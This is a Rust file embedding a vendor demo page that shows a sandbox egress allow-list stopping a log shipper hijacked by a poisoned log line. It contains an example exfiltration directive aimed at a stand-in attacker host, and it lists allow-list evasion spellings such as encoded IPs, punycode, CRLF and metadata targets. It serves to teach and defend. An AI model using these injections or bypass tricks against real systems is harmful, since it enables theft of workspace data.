//! The single-file branded UI (Cosmonic night mode) served by the `shipper`
//! component.
//!
//! One red button per attack, one green button for the legitimate send. Every
//! button calls `/run` (or `/fuzz`) on this component; the shipper makes the
//! outbound request through the host and the page shows the runtime's answer
//! and the JSON verdict as returned. The one-line fuzz result is fetched live
//! on every page load.

pub const PAGE: &str = r###"<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Cosmonic Sandbox — Stopping exfiltration (ATT&amp;CK T1041)</title>
<link rel="icon" type="image/svg+xml" href="/favicon.svg">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<style>
  :root{
    --bg:#090D18; --bg2:#0C1120; --panel:#111728; --card:#151D31; --card2:#121A2C;
    --line:#26324B; --line2:#2E3B57;
    --purple:#685BC7; --purple-lt:#8F84E6; --purple-dim:rgba(104,91,199,.16);
    --green:#00C389; --green-dim:rgba(0,195,137,.14); --green-line:rgba(0,195,137,.45);
    --red:#E07A58; --red-dim:rgba(224,122,88,.15); --red-line:rgba(224,122,88,.5);
    --amber:#F5B544;
    --ink:#EAEEF7; --muted:#93A0B8; --faint:#5C6880;
    --mono:'IBM Plex Mono',ui-monospace,SFMono-Regular,Menlo,monospace;
    --sans:'Plus Jakarta Sans',system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
  }
  *{box-sizing:border-box}
  html,body{margin:0}
  body{
    background:
      radial-gradient(900px 500px at 82% -8%, rgba(104,91,199,.22), transparent 60%),
      radial-gradient(700px 500px at 0% 0%, rgba(0,195,137,.08), transparent 55%),
      var(--bg);
    color:var(--ink); font-family:var(--sans); line-height:1.55;
    -webkit-font-smoothing:antialiased;
  }
  .wrap{max-width:1100px; margin:0 auto; padding:28px 20px 72px}
  a{color:var(--purple-lt); text-decoration:none} a:hover{text-decoration:underline}

  /* top bar */
  .top{display:flex; align-items:center; justify-content:space-between; gap:16px; margin-bottom:34px}
  .brand{display:flex; align-items:center; gap:11px; font-weight:800; letter-spacing:-.01em; font-size:19px; color:var(--ink)}
  .brand:hover{text-decoration:none; opacity:.9}
  .brand .mark{width:26px;height:26px;border-radius:8px;
    background:linear-gradient(135deg,var(--purple),#4b3fb0);
    display:grid;place-items:center;box-shadow:0 0 0 1px rgba(143,132,230,.5),0 8px 22px rgba(104,91,199,.4)}
  .brand .mark svg{width:15px;height:15px}
  .brand small{font-weight:600;color:var(--muted);font-size:12px;letter-spacing:.14em;text-transform:uppercase;margin-left:2px}
  .legend{display:flex;gap:14px;font-size:12.5px;color:var(--muted);align-items:center;flex-wrap:wrap}
  .legend b{font-weight:600}
  .dot{display:inline-block;width:9px;height:9px;border-radius:50%;margin-right:6px;vertical-align:1px}
  .dot.g{background:var(--green)} .dot.d{background:transparent;box-shadow:inset 0 0 0 1.5px var(--faint)} .dot.b{background:var(--red)}

  /* blog callout */
  .callout{display:flex;align-items:center;gap:15px;margin:0 0 28px;padding:15px 18px;border-radius:14px;
    border:1px solid var(--purple);background:linear-gradient(135deg,rgba(104,91,199,.2),rgba(104,91,199,.05));
    box-shadow:0 0 0 1px rgba(143,132,230,.22),0 20px 46px -30px rgba(104,91,199,.95);
    transition:border-color .15s ease, transform .05s ease}
  .callout:hover{text-decoration:none;border-color:var(--purple-lt);transform:translateY(-1px)}
  .callout .flag{flex:none;font-family:var(--mono);font-size:10.5px;font-weight:700;letter-spacing:.14em;text-transform:uppercase;
    color:#fff;background:linear-gradient(135deg,var(--purple),#4b3fb0);padding:6px 11px;border-radius:8px;
    box-shadow:0 8px 20px -10px rgba(104,91,199,.8)}
  .callout .ct{flex:1;min-width:0}
  .callout .ct .h{display:block;color:var(--ink);font-weight:800;font-size:15.5px;letter-spacing:-.01em}
  .callout .ct .d{display:block;color:var(--muted);font-size:13px;margin-top:3px}
  .callout .arr{flex:none;color:var(--purple-lt);font-weight:800;font-size:22px;line-height:1}
  @media(max-width:620px){.callout{gap:12px;padding:13px 15px}.callout .arr{display:none}}

  /* hero */
  .eyebrow{color:var(--purple-lt);font-weight:700;font-size:12.5px;letter-spacing:.16em;text-transform:uppercase;margin:0 0 10px}
  h1{font-size:clamp(28px,5vw,46px);line-height:1.04;letter-spacing:-.02em;margin:0 0 14px;font-weight:800}
  h1 .u{color:var(--purple-lt)}
  .lede{font-size:clamp(15px,2.1vw,18px);color:#C3CCDD;max-width:68ch;margin:0 0 6px}
  .lede b{color:var(--ink)}
  .brand .logo{height:28px;width:auto;display:block}
  .heroimg{display:block;margin:24px 0 2px;border:1px solid var(--line);border-radius:16px;overflow:hidden;box-shadow:0 26px 64px -32px rgba(0,0,0,.85)}
  .heroimg img{display:block;width:100%;height:auto}

  /* architecture */
  .arch{display:grid;grid-template-columns:200px 1fr;gap:18px;margin:30px 0 8px;align-items:stretch}
  @media(max-width:760px){.arch{grid-template-columns:1fr}}
  .you{border:1px dashed var(--line2);border-radius:16px;padding:18px;background:linear-gradient(180deg,var(--panel),var(--bg2));display:flex;flex-direction:column;gap:10px;justify-content:center}
  .you .av{width:46px;height:46px;border-radius:50%;background:radial-gradient(circle at 35% 30%,var(--amber),#c98a12);box-shadow:0 0 0 5px rgba(245,181,68,.14)}
  .you h3{margin:2px 0 0;font-size:18px}
  .you p{margin:0;color:var(--muted);font-size:13px}
  .you .ask{margin-top:4px;background:var(--amber);color:#2a1e00;font-weight:700;font-size:12.5px;border-radius:9px;padding:8px 11px;font-family:var(--mono)}

  .sandbox{border:1px dashed var(--purple);border-radius:18px;padding:14px;background:rgba(104,91,199,.05);position:relative}
  .sandbox > .sbtag{position:absolute;top:-10px;left:16px;background:var(--bg);color:var(--purple-lt);font-size:11px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;padding:0 8px}
  .cards{display:grid;grid-template-columns:1fr 1fr;gap:14px}
  @media(max-width:680px){.cards{grid-template-columns:1fr}}
  .card{border:1px solid var(--line);border-radius:14px;background:linear-gradient(180deg,var(--card),var(--card2));padding:15px 15px 13px;position:relative;box-shadow:0 1px 0 rgba(255,255,255,.02) inset,0 18px 40px -28px rgba(0,0,0,.8)}
  .card.ok{border-color:var(--green-line);box-shadow:0 0 0 1px var(--green-line),0 0 34px -10px rgba(0,195,137,.3)}
  .card .role{color:var(--muted);font-size:11px;font-weight:600;letter-spacing:.1em;text-transform:uppercase}
  .card h4{margin:3px 0 2px;font-size:17px;font-weight:700}
  .card .host{font-family:var(--mono);font-size:12px;color:var(--purple-lt)}
  .card .lock{position:absolute;right:12px;bottom:11px;color:var(--green);opacity:.8}
  .grants{margin-top:11px;display:flex;flex-direction:column;gap:6px}
  .g-row{display:flex;align-items:center;gap:8px;font-size:12.5px}
  .pill{font-family:var(--mono);font-size:11px;font-weight:600;padding:3px 8px;border-radius:7px;white-space:nowrap}
  .pill.g{color:#8ff0cd;background:var(--green-dim);box-shadow:inset 0 0 0 1px var(--green-line)}
  .pill.d{color:var(--faint);background:transparent;box-shadow:inset 0 0 0 1px var(--line)}
  .pill.b{color:#f3b79e;background:var(--red-dim);box-shadow:inset 0 0 0 1px var(--red-line)}
  .g-row .meta{color:var(--muted);font-family:var(--mono);font-size:11.5px}
  .deny{color:var(--faint);font-size:11.5px;font-family:var(--mono);margin-top:3px}

  /* try it */
  .try{margin:34px 0 0;border:1px solid var(--line);border-radius:18px;background:linear-gradient(180deg,var(--panel),var(--bg2));padding:22px}
  .try h2{margin:0 0 4px;font-size:21px;letter-spacing:-.01em}
  .try .sub{color:var(--muted);font-size:14px;margin:0 0 16px}
  .btns{display:flex;gap:12px;flex-wrap:wrap;align-items:center}
  .btn{appearance:none;border:0;cursor:pointer;font-family:var(--sans);font-weight:700;font-size:14.5px;border-radius:11px;padding:12px 18px;transition:transform .05s ease, box-shadow .2s ease}
  .btn:active{transform:translateY(1px)}
  .btn.primary{color:#fff;background:linear-gradient(135deg,var(--purple),#4b3fb0);box-shadow:0 10px 26px -10px rgba(104,91,199,.8)}
  /* attack buttons — red, because clicking one fires a real exploit at the sandbox */
  .btn.attack{color:#fff;background:linear-gradient(135deg,var(--red),#b24a30);box-shadow:0 10px 26px -10px rgba(224,122,88,.8)}
  .btn.attack.all{background:linear-gradient(135deg,#c2452b,#7f3020)}
  .btn.ghost{color:var(--ink);background:transparent;box-shadow:inset 0 0 0 1px var(--line2)}
  .dllinks{margin-top:12px;font-family:var(--mono);font-size:11.5px;color:var(--faint)}
  .dllinks a{color:var(--muted)}
  .btn[disabled]{opacity:.55;cursor:progress}
  .drop{margin-top:14px;border:1.5px dashed var(--line2);border-radius:12px;padding:14px;text-align:center;color:var(--muted);font-size:13px}
  .drop.hot{border-color:var(--purple);background:var(--purple-dim);color:var(--ink)}
  .flow{font-family:var(--mono);font-size:11.5px;color:var(--faint);margin-top:12px}
  .flow b{color:var(--muted);font-weight:600}

  /* result */
  #out{margin-top:18px;display:none}
  .verdict{border-radius:13px;padding:15px 16px;font-size:15px;display:flex;gap:12px;align-items:flex-start}
  .verdict.mit{background:var(--green-dim);box-shadow:inset 0 0 0 1px var(--green-line)}
  .verdict.vuln{background:var(--red-dim);box-shadow:inset 0 0 0 1px var(--red-line)}
  .verdict .ico{font-size:20px;line-height:1.3}
  .verdict b{font-weight:800}
  .stats{display:flex;gap:10px;flex-wrap:wrap;margin:14px 0 4px}
  .stat{flex:1;min-width:150px;border:1px solid var(--line);border-radius:11px;padding:11px 13px;background:var(--card2)}
  .stat .n{font-size:24px;font-weight:800;font-family:var(--mono)}
  .stat .k{font-size:11.5px;color:var(--muted);letter-spacing:.03em}
  .stat.good .n{color:var(--green)} .stat.bad .n{color:var(--red)}
  table{width:100%;border-collapse:collapse;margin-top:14px;font-size:12.5px}
  th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line)}
  th{color:var(--muted);font-weight:600;font-size:11px;letter-spacing:.05em;text-transform:uppercase}
  td{font-family:var(--mono);vertical-align:top}
  .tag{font-family:var(--mono);font-size:10.5px;font-weight:600;padding:2px 7px;border-radius:6px}
  .tag.red{color:#f3b79e;background:var(--red-dim);box-shadow:inset 0 0 0 1px var(--red-line)}
  .tag.grn{color:#8ff0cd;background:var(--green-dim);box-shadow:inset 0 0 0 1px var(--green-line)}
  .err{color:var(--red);font-family:var(--mono);font-size:13px}
  /* explainer table: which button fires which bug */
  .bugtable{margin:6px 0 4px}
  .bugtable td{font-family:var(--sans);vertical-align:top;color:var(--muted);font-size:13px}
  .bugtable td:nth-child(2){font-family:var(--mono);font-size:11.5px;color:var(--red-tint,#f3b79e);white-space:nowrap}
  /* phones: each row becomes a card — tag + vulnerability, description below */
  @media(max-width:620px){
    .bugtable,.bugtable tbody{display:block}
    .bugtable thead{display:none}
    .bugtable tr{display:grid;grid-template-columns:auto 1fr;align-items:center;gap:6px 10px;padding:12px 0;border-bottom:1px solid var(--line)}
    .bugtable td{padding:0;border:0}
    .bugtable td:nth-child(2){white-space:normal}
    .bugtable td:nth-child(3){grid-column:1/-1}
  }
  .bugtag{display:inline-block;font-family:var(--mono);font-size:11px;font-weight:700;padding:3px 9px;border-radius:7px;white-space:nowrap;color:#f3b79e;background:var(--red-dim);box-shadow:inset 0 0 0 1px var(--red-line)}
  .cloaknote{font-family:var(--mono);font-size:10.5px;color:#f3b79e;margin-top:3px}
  .landpath{font-family:var(--mono);font-size:11px;color:#8ff0cd;margin-left:6px;word-break:break-all}

  /* learn */
  .learn{margin:40px 0 0}
  .learn h2{font-size:21px;margin:0 0 4px}
  .learn p.sub{color:var(--muted);margin:0 0 18px;font-size:14px}
  .links{display:grid;grid-template-columns:1fr 1fr;gap:14px}
  @media(max-width:680px){.links{grid-template-columns:1fr}}
  .lk{display:block;border:1px solid var(--line);border-radius:13px;padding:15px 16px;background:var(--card2);transition:border-color .15s ease, transform .05s ease}
  .lk:hover{border-color:var(--purple);text-decoration:none;transform:translateY(-1px)}
  .lk .t{color:var(--ink);font-weight:700;font-size:15px;display:flex;align-items:center;gap:8px}
  .lk .t .arr{color:var(--purple-lt);font-weight:700}
  .lk .d{color:var(--muted);font-size:13px;margin-top:4px}
  .foot{margin-top:40px;padding-top:18px;border-top:1px solid var(--line);color:var(--faint);font-size:12.5px;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
  .foot code{font-family:var(--mono);color:var(--muted)}
  .foot .legal{display:flex;gap:6px 14px;flex-wrap:wrap;align-items:center}
  .foot .legal button{appearance:none;border:0;background:none;padding:0;font:inherit;color:var(--purple-lt);cursor:pointer}
  .foot .legal button:hover{text-decoration:underline}
  /* egress demo additions */
  .fuzzline{display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin:18px 0 0;padding:12px 15px;border-radius:12px;
    border:1px solid var(--line);background:var(--card2);font-family:var(--mono);font-size:13px;color:var(--muted)}
  .fuzzline b{color:var(--ink);font-weight:600}
  .fuzzline .n{color:var(--green);font-weight:700}
  .fuzzline .n.bad{color:var(--red)}
  .btn.send{color:#062a1f;background:linear-gradient(135deg,var(--green),#00996b);box-shadow:0 10px 26px -10px rgba(0,195,137,.7)}
  .answer{font-family:var(--mono);font-size:11.5px;color:#f3b79e;word-break:break-word}
  .answer.ok{color:#8ff0cd}
  .inj{font-family:var(--mono);font-size:10.5px;color:var(--amber);margin-top:4px;word-break:break-word}
  td.dest{word-break:break-all}
  .you .ask{word-break:break-all}
  details.raw{margin-top:14px;border:1px solid var(--line);border-radius:11px;background:var(--card2)}
  details.raw summary{cursor:pointer;padding:10px 13px;font-family:var(--mono);font-size:12px;color:var(--muted)}
  details.raw pre{margin:0;padding:0 13px 13px;font-family:var(--mono);font-size:11.5px;color:#C3CCDD;white-space:pre-wrap;word-break:break-word;max-height:420px;overflow:auto}
  .scroll{max-height:460px;overflow:auto;margin-top:6px}
</style>
<!-- Cosmonic analytics, only where Cosmonic hosts this demo: a local copy (on
     Cosmonic Desktop, say) loads none of it. /site.js is consent-gated: the
     HubSpot cookie banner loads first, then Google Tag Manager and Apollo only
     once consent allows. The Ahrefs beacon is cookieless. -->
<script>
  if (/(^|\.)[ck]osmonic\.com$/.test(location.hostname)) {
    [['/site.js'], ['https://analytics.ahrefs.com/analytics.js', '8tGIHvyVLh6u4Ygcn/24CA']].forEach(function (t) {
      var s = document.createElement('script');
      s.src = t[0];
      s.async = true;
      if (t[1]) s.setAttribute('data-key', t[1]);
      document.head.appendChild(s);
    });
  }
</script>
</head>
<body>
<div class="wrap">

  <div class="top">
    <a class="brand" href="https://cosmonic.com/" target="_blank" rel="noopener" aria-label="Cosmonic — cosmonic.com">
      <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 191.08 42.03"><g id="Layer_2" data-name="Layer 2"><g id="Layer_1-2" data-name="Layer 1"><path fill="#8FA0B8" d="M95.08,20a7.93,7.93,0,0,0-1.18-.33c-1-.2-2-.35-3-.57a8,8,0,0,1-1.79-.58,1.51,1.51,0,0,1-.42-2.43,2.47,2.47,0,0,1,.92-.64,4.86,4.86,0,0,1,3.54,0,2.2,2.2,0,0,1,1.49,1.85.17.17,0,0,1,0,.07.13.13,0,0,0,.12.11h0l2.62-.79a.43.43,0,0,0,.3-.51A4.29,4.29,0,0,0,96,13.61a7.76,7.76,0,0,0-7.42-.92,5.42,5.42,0,0,0-3.54,5.66,4,4,0,0,0,3,3.24c1.21.37,2.48.56,3.72.87a10.92,10.92,0,0,1,2.21.69,1.67,1.67,0,0,1,.3,2.82,2.9,2.9,0,0,1-1,.56,5,5,0,0,1-3.13.08,2.7,2.7,0,0,1-2.07-1.95c0-.07-.07-.21-.07-.21a.11.11,0,0,0-.11-.11h0l-2.71.81a.43.43,0,0,0-.29.53,4.93,4.93,0,0,0,2.33,3.05,8.76,8.76,0,0,0,7.85.43,4.86,4.86,0,0,0,3.12-3.58A4.74,4.74,0,0,0,95.08,20Z"/><path fill="#8FA0B8" d="M123.89,13.51A6.44,6.44,0,0,0,115,14.59l-.41.51c-2-3.61-7.25-4-10.4-.44-.21-.72-.41-1.41-.59-2.07h-2.4V29.43h3.43v-.64c0-2.82,0-5.64,0-8.46a5.15,5.15,0,0,1,1.78-4.25A3.22,3.22,0,0,1,111.73,18a10.28,10.28,0,0,1,.17,1.91c0,2.95,0,5.9,0,8.85v.66h3.39c0-1,0-2,0-2.94,0-2.35,0-4.69.07-7a4.43,4.43,0,0,1,1.27-3,3.48,3.48,0,0,1,3.67-1,3,3,0,0,1,2.13,2.62,9.88,9.88,0,0,1,.16,1.8c0,3,0,5.94,0,8.9v.66H126a2,2,0,0,0,0-.29c0-3.68,0-7.37,0-11A5.91,5.91,0,0,0,123.89,13.51Z"/><path fill="#8FA0B8" d="M74.29,12.13A8.75,8.75,0,0,0,65.22,21a9.08,9.08,0,0,0,18.15,0A8.77,8.77,0,0,0,74.29,12.13ZM74.2,26.57a5.36,5.36,0,0,1-5.43-5.63,5.52,5.52,0,1,1,11,.14A5.33,5.33,0,0,1,74.2,26.57Z"/><path fill="#8FA0B8" d="M137.56,12.13A8.74,8.74,0,0,0,128.45,21a9.08,9.08,0,0,0,18.15.08A8.77,8.77,0,0,0,137.56,12.13Zm-.05,14.44A5.36,5.36,0,0,1,132,21a5.52,5.52,0,1,1,11,0A5.33,5.33,0,0,1,137.51,26.57Z"/><path fill="#8FA0B8" d="M162.65,14.53a6.61,6.61,0,0,0-7-2.13,7,7,0,0,0-3.87,2.49c-.25-.81-.47-1.56-.7-2.31h-2.38V29.43h3.46v-.69c0-2.9,0-5.79,0-8.69a4.57,4.57,0,0,1,3.92-4.71,3.57,3.57,0,0,1,4.32,2.95,9.36,9.36,0,0,1,.16,1.91c0,2.87,0,5.75,0,8.63v.59h3.46a1.08,1.08,0,0,0,0-.19c0-3.52,0-7,0-10.55A7,7,0,0,0,162.65,14.53Z"/><path fill="#8FA0B8" d="M59.23,23.78A4.9,4.9,0,0,1,57,26a5.36,5.36,0,0,1-6.71-1.55A5.88,5.88,0,0,1,50.76,17a5.45,5.45,0,0,1,8.52,1.13c.1.17.27.42.42.43,1.06,0,2.12,0,3.18,0-.2-3.41-4.28-6.49-8.48-6.46a8.7,8.7,0,0,0-8.77,8.57,8.68,8.68,0,0,0,8.31,9.17,8.35,8.35,0,0,0,9-6.55c-1,0-1.95,0-2.9,0A.74.74,0,0,0,59.23,23.78Z"/><path fill="#8FA0B8" d="M188.16,23.31a.7.7,0,0,0-.76.44A4.92,4.92,0,0,1,185.19,26a5.35,5.35,0,0,1-6.78-1.6A5.86,5.86,0,0,1,179,17a5.46,5.46,0,0,1,8.48,1.19c.1.17.28.41.43.42,1.05,0,2.11,0,3.18,0a8.23,8.23,0,0,0-8.93-6.43,8.66,8.66,0,0,0-8.34,9.07,8.72,8.72,0,0,0,8.68,8.66c4.19.12,8.33-3,8.61-6.57C190.1,23.32,189.13,23.33,188.16,23.31Z"/><path fill="#8FA0B8" d="M167.74,29.42h3.43V12.57h-3.43Z"/><path fill="#8FA0B8" d="M171.17,7.05h-3.42v3.42h3.42Z"/><path fill="#8F84E6" d="M17.47,32.38C15.36,26.74,12.59,24,6.92,21.89a.93.93,0,0,1,0-1.75c5.67-2.11,8.44-4.86,10.55-10.5a.93.93,0,0,1,1.76,0c1.7,5.7,3.67,9.57,16.62,9.82a.93.93,0,0,0,.94-.93V12.17a3.35,3.35,0,0,0-1.65-2.88L20.07.46a3.3,3.3,0,0,0-3.35,0L1.65,9.29A3.35,3.35,0,0,0,0,12.18V29.87a3.33,3.33,0,0,0,1.65,2.88l15.07,8.83a3.34,3.34,0,0,0,3.35,0l15.07-8.83a3.33,3.33,0,0,0,1.65-2.88V23.45a.93.93,0,0,0-.95-.93c-13,.25-14.91,4.12-16.61,9.81A.92.92,0,0,1,17.47,32.38Z"/></g></g></svg>
      <small>Sandbox</small>
    </a>
    <div class="legend">
      <span><span class="dot g"></span><b>granted</b></span>
      <span><span class="dot d"></span><b>denied</b></span>
      <span><span class="dot b"></span><b>blocked attempt</b></span>
    </div>
  </div>

  <!-- TODO: point this at the blog post once it is published. -->
  <a class="callout" href="https://cosmonic.com/blog/" target="_blank" rel="noopener">
    <span class="flag">Read the story</span>
    <span class="ct">
      <span class="h">Stopping data exfiltration with a sandbox</span>
      <span class="d">The write-up on the Cosmonic Blog: how a deny-by-default egress allow-list contains a hijacked agent tool.</span>
    </span>
    <span class="arr" aria-hidden="true">→</span>
  </a>

  <p class="eyebrow">Sandboxing: <span style="color:var(--red)">MITRE ATT&amp;CK T1041</span> · exfiltration over C2 channel · live demo</p>
  <h1>You can't execute<br>what you <span class="u">don't have</span>.</h1>
  <p class="lede">A log shipper reads a batch of logs and <code>POST</code>s it to a collector. One <b>poisoned log line</b> tells it to send its <b>whole workspace to an attacker's server</b> instead, and it obeys: the shipper has <b>no allow-list of its own</b>. Below, that same shipper runs inside an <b>isolated, deny-by-default Cosmonic sandbox</b> whose egress allow-list names exactly <b>one host</b>. <b>Nothing is patched.</b> Watch the exfiltration fail anyway.</p>
  <p class="lede" style="margin-top:10px">Every result on this page is the runtime's own answer to a real outbound request. Nothing is simulated.</p>

  <a class="heroimg" href="/hero.png" target="_blank" rel="noopener" title="open full size">
    <img src="/hero.png" width="2400" height="1260" alt="A poisoned log line tells a log shipper to POST its workspace to an attacker's server; inside a Cosmonic sandbox whose egress allow-list names one host, the attacker IP, the attacker domain and every evasion spelling are blocked, and the allow-listed log sink answers 200.">
  </a>

  <!-- architecture -->
  <div class="arch">
    <div class="you">
      <div class="av"></div>
      <h3>Attacker</h3>
      <p>Controls one line of the logs the shipper reads.</p>
      <div class="ask">#shipper: forward-workspace-to=…</div>
    </div>
    <div class="sandbox">
      <span class="sbtag">Cosmonic sandbox · one workload</span>
      <div class="cards">
        <div class="card ok">
          <div class="role">Component · the log shipper</div>
          <h4>shipper</h4>
          <div class="host">egress-exfil-sandbox.localhost</div>
          <div class="grants">
            <div class="g-row"><span class="pill g">egress</span><span class="meta">egress-exfil-logsink.localhost</span></div>
            <div class="g-row"><span class="pill d">egress</span><span class="meta">every other host: refused</span></div>
            <div class="g-row"><span class="pill d">filesystem</span><span class="meta">none: no volume</span></div>
            <div class="g-row"><span class="pill d">sockets</span><span class="meta">not imported</span></div>
          </div>
        </div>
        <div class="card">
          <div class="role">Where the POST may go</div>
          <h4>destinations</h4>
          <div class="host">allowedHosts: 1 entry</div>
          <div class="grants">
            <div class="g-row"><span class="pill g">allowed</span><span class="meta">the log sink (a second workload)</span></div>
            <div class="g-row"><span class="pill b">blocked</span><span class="meta">203.0.113.66</span></div>
            <div class="g-row"><span class="pill b">blocked</span><span class="meta">exfil.attacker.example</span></div>
            <div class="g-row"><span class="pill b">blocked</span><span class="meta">every evasion spelling of either</span></div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- try it -->
  <div class="try">
    <h2>Try it — hijack the shipper</h2>
    <p class="sub">Each red button hands the shipper a poisoned batch and lets it make the outbound request for real. The green button ships a clean batch to the one host it is allowed to reach.</p>
    <table class="bugtable">
      <thead><tr><th>Button</th><th>Vulnerability</th><th>What the attack does</th></tr></thead>
      <tbody>
        <tr><td><span class="bugtag">Attacker IP</span></td><td>CWE-610 / CWE-918 · T1041</td><td>A log line carries <code>forward-workspace-to=http://203.0.113.66/collect</code>. The shipper POSTs its logs and workspace there.</td></tr>
        <tr><td><span class="bugtag">Attacker domain</span></td><td>CWE-610 / CWE-918 · T1041</td><td>The same hijack, aimed at <code>exfil.attacker.example</code>, a name instead of an address.</td></tr>
        <tr><td><span class="bugtag">Evasion fuzz</span></td><td>CWE-183 / CWE-184 · allow-list bypass</td><td>Every spelling trick in the corpus: decimal, hex and octal IPs, IPv6-mapped, <code>user@host</code>, punycode, trailing dots, CRLF, metadata and loopback targets.</td></tr>
        <tr><td><span class="bugtag">Run all</span></td><td>all of the above</td><td>Both exfiltration attempts, the legitimate send and the fuzz in one report.</td></tr>
      </tbody>
    </table>
    <div class="btns">
      <button class="btn attack" id="runExfil">☣ Exfiltrate to attacker IP</button>
      <button class="btn attack" id="runDomain">☣ Exfiltrate to attacker domain</button>
      <button class="btn attack" id="runFuzz">☣ Run evasion fuzz</button>
      <button class="btn attack all" id="runAll">☣ Run all</button>
      <button class="btn send" id="runAllowed">→ Send to allowed host</button>
    </div>
    <div class="dllinks">inspect the inputs: <a href="/corpus.txt">corpus.txt</a> · raw API: <a href="/run?mode=all">/run?mode=all</a> · <a href="/fuzz">/fuzz</a></div>
    <div class="fuzzline" id="fuzzline"><b>Evasion fuzz:</b> <span id="fuzztext">running against this deployment…</span></div>
    <div class="flow" id="target"></div>

    <div id="out">
      <div id="verdict"></div>
      <div class="stats" id="stats"></div>
      <div id="table"></div>
      <details class="raw"><summary>the JSON verdict, as returned</summary><pre id="raw"></pre></details>
    </div>
  </div>

  <!-- learn -->
  <div class="learn">
    <h2>Where to go next</h2>
    <p class="sub">What each of these is for, in plain terms:</p>
    <div class="links">
      <a class="lk" href="https://cosmonic.com/ai-sandbox/choosing-an-agent-sandbox/" target="_blank" rel="noopener">
        <div class="t">Choosing a sandbox <span class="arr">→</span></div>
        <div class="d">The decision guide: which kind of sandbox fits your risk, and why capability-scoped beats "scan it and hope."</div>
      </a>
      <a class="lk" href="https://cosmonic.com/ai-sandbox/principles/" target="_blank" rel="noopener">
        <div class="t">The 6 principles <span class="arr">→</span></div>
        <div class="d">The security rules this demo runs on — deny-by-default, least authority, policy enforcement points — from Saltzer &amp; Schroeder to NIST.</div>
      </a>
      <a class="lk" href="https://cosmonic.com/desktop/" target="_blank" rel="noopener">
        <div class="t">Cosmonic Desktop <span class="arr">→</span></div>
        <div class="d">Run this on your own laptop. The local app that sandboxes these components — free beta, installs in minutes.</div>
      </a>
      <a class="lk" href="https://cosmonic.com/control/" target="_blank" rel="noopener">
        <div class="t">Cosmonic Control <span class="arr">→</span></div>
        <div class="d">The same sandboxes in production — across any cloud or Kubernetes, when you're ready to ship past the laptop.</div>
      </a>
    </div>
  </div>

  <div class="foot">
    <span>The shipper's bug is not patched and it has no allow-list of its own · the attacker hosts, <code>203.0.113.66</code> (TEST-NET-3) and <code>.example</code>, are reserved and never routed · contained by the sandbox.</span>
    <span class="legal">
      <a href="https://cosmonic.com/ai-sandbox/" target="_blank" rel="noopener">cosmonic.com/ai-sandbox</a>
      <a href="https://cosmonic.com/legal/privacy-policy/" target="_blank" rel="noopener">Privacy</a>
      <a href="https://cosmonic.com/legal/cookie-policy/" target="_blank" rel="noopener">Cookies</a>
      <span id="cookie-prefs-item" hidden><button type="button" id="cookie-prefs">Cookie Preferences</button></span>
      <span>© 2026 Cosmonic</span>
    </span>
  </div>

</div>

<script>
  // One origin. The browser calls /run on the shipper; the shipper makes the
  // outbound request through the host, and the host's answer comes back as JSON.
  document.getElementById('target').innerHTML =
    '<b>GET</b> /run  →  shipper routes the batch  →  <b>wasi:http/client</b>  →  the egress allow-list decides';

  const $ = (id)=>document.getElementById(id);
  const out=$('out');

  const BUTTONS = {
    runExfil:   {url:'/run?mode=exfil',   label:'☣ Exfiltrate to attacker IP'},
    runDomain:  {url:'/run?mode=domain',  label:'☣ Exfiltrate to attacker domain'},
    runFuzz:    {url:'/fuzz',             label:'☣ Run evasion fuzz'},
    runAll:     {url:'/run?mode=all',     label:'☣ Run all'},
    runAllowed: {url:'/run?mode=allowed', label:'→ Send to allowed host'},
  };
  const btns = Object.keys(BUTTONS).map($);

  async function send(id){
    btns.forEach(b=>b.disabled=true);
    $(id).textContent='… asking the runtime';
    try{
      const res = await fetch(BUTTONS[id].url);
      const report = await res.json();
      if(id==='runFuzz'){ renderFuzz(report); } else { render(report); }
      $('raw').textContent = JSON.stringify(report, null, 2);
    }catch(e){
      out.style.display='block';
      $('verdict').innerHTML='<div class="verdict vuln"><span class="ico">⚠</span><div>Could not run the sandbox.<br><span class="err">'+esc(e)+'</span></div></div>';
      $('stats').innerHTML=''; $('table').innerHTML=''; $('raw').textContent='';
    }finally{
      btns.forEach(b=>{b.disabled=false; b.textContent=BUTTONS[b.id].label;});
    }
  }
  Object.keys(BUTTONS).forEach(id=>$(id).addEventListener('click', ()=>send(id)));

  function esc(s){return String(s==null?'':s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]))}
  function stat(cls,n,k){return '<div class="stat '+cls+'"><div class="n">'+(n==null?'—':n)+'</div><div class="k">'+k+'</div></div>'}
  // Show control characters instead of letting them vanish.
  function vis(s){return esc(String(s).replace(/[\x00-\x1f\x7f]/g,c=>'\\x'+c.charCodeAt(0).toString(16).padStart(2,'0')))}

  // What the runtime said, for one attempt.
  function answer(a){
    if(a.outcome==='connected'){
      return '<span class="answer ok">HTTP '+esc(a.http_status)+(a.response?' · '+esc(String(a.response).slice(0,140)):'')+'</span>';
    }
    return '<span class="answer">'+esc(a.runtime_error||'')+(a.rejected_at?' ('+esc(a.rejected_at)+')':'')+'</span>';
  }
  // An attempt that had to be refused: red BLOCKED. One that was meant to
  // arrive: green. Anything hostile that got past the policy: flagged.
  function tag(a, hostile){
    if(a.outcome==='denied')   return '<span class="tag red" title="refused by the egress allow-list">BLOCKED</span>';
    if(a.outcome==='rejected') return '<span class="tag red" title="the runtime would not accept this as a request">REJECTED</span>';
    if(hostile)                return '<span class="tag red" style="background:var(--red);color:#fff">ESCAPED</span>';
    if(a.outcome==='connected')return '<span class="tag grn">'+(a.http_status===200?'DELIVERED':'REACHED')+'</span>';
    return '<span class="tag grn" title="past the allow-list, then a transport error">ALLOWED</span>';
  }

  function render(r){
    out.style.display='block';
